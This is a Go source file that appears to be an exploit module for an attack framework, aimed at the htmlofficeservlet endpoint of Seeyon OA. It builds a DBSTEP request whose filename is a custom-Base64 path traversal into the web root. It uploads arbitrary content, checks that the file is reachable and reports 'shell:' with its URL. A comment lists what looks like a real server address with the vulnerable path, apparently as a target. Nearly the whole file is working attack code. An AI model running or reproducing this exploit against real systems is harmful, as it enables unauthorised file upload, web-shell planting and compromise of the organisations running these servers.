package exp_seeyonOA

import (
	"fmt"
	"github.com/lz520520/railgunlib/pkg/register/exp_register"
	"github.com/lz520520/railgunlib/pkg/templates/code_invoke"
	"github.com/lz520520/railgunlib/pkg/templates/code_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_model"
	"github.com/lz520520/railgunlib/pkg/templates/exp_templates"
	"strings"
)

// #####################编码转换模块生成#########################
func Base64Encode(src, alphabet string) (dst string, err error) {
	codeParams := []code_model.CodeParams{

		{
			CodeType:   "char",
			CodeName:   "Base64",
			CodeMode:   "Encode",
			CodeStatus: true,
			CodeOptions: []code_model.CodeOption{

				{
					KeyName: "prefix",
					Value:   "",
				},

				{
					KeyName: "alphabet",
					Value:   alphabet,
				},
			},
		},
	}
	return code_invoke.CodeInvoke(src, codeParams)
}

// #####################编码转换模块生成#########################

type Exp_htmlofficeServlet struct {
	exp_templates.ExpTemplate
}

func (self *Exp_htmlofficeServlet) Attack_upload1() (expResult exp_model.ExpResult) {
	filename := self.MustGetStringParam("filename")
	content := self.MustGetStringParam("content")
	// 构造数据
	headers := self.GetInitExpHeaders()

	url := self.Params.BaseParam.Target
	if !strings.Contains(strings.ToLower(url), "htmlofficeservlet") {
		url = strings.TrimRight(url, "/") + "/seeyon/htmlofficeservlet"

	}

	crypto_filename, _ := Base64Encode("../../../ApacheJetspeed/webapps/seeyon/"+filename, "gx74KW1roM9qwzPFVOBLSlYaeyncdNbI=JfUCQRHtj2+Z05vshXi3GAEuT/m8Dpk6")
	offset := 283 + len(crypto_filename)
	contentLen := len(content) + 10
	payload := fmt.Sprintf("DBSTEP V3.0     %d             0               %d             DBSTEP=OKMLlKlV\r\n", offset, contentLen)
	payload += "OPTION=S3WYOSWLBSGr\r\n"
	payload += "currentUserId=zUCTwigsziCAPLesw4gsw4oEwV66\r\n"
	payload += "CREATEDATE=wUghPB3szB3Xwg66\r\n"
	payload += "RECORDID=qLSGw4SXzLeGw4V3wUw3zUoXwid6\r\n"
	payload += "originalFileId=wV66\r\n"
	payload += "originalCreateDate=wUghPB3szB3Xwg66\r\n"
	payload += fmt.Sprintf("FILENAME=%s\r\n", string(crypto_filename))
	payload += "needReadFile=yRWZdAS6\r\n"
	payload += "originalCreateDate=wLSGP4oEzLKAz4=iz=66\r\n"
	payload += fmt.Sprintf("a%saaaaaaaaaaaaaaaa", content)

	// 发送请求
	httpresp := self.HttpPostWithoutRedirect(url, payload, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()

		return
	}
	uploadUrl := strings.Replace(url, "htmlofficeservlet", "", 1) + filename

	httpresp = self.HttpGetWithoutRedirect(uploadUrl, headers)
	if httpresp.Err != nil {
		expResult.Err = httpresp.Err.Error()
		return
	}
	if httpresp.Resp.StatusCode == 200 {
		expResult.Status = true
		self.EchoSuccessMsg("shell: %s", uploadUrl)
	}
	return
}

func init() {
	//https://paper.seebug.org/964/
	//fmt.Printf("%v, %v", reflect.ValueOf(test).Type(), reflect.ValueOf(test).Kind())
	// http://222.178.12.21:888/seeyon/htmlofficeservlet

	exp_register.ExpStructRegister(&Exp_htmlofficeServlet{}, "exp_htmlofficeservlet.yml")
}
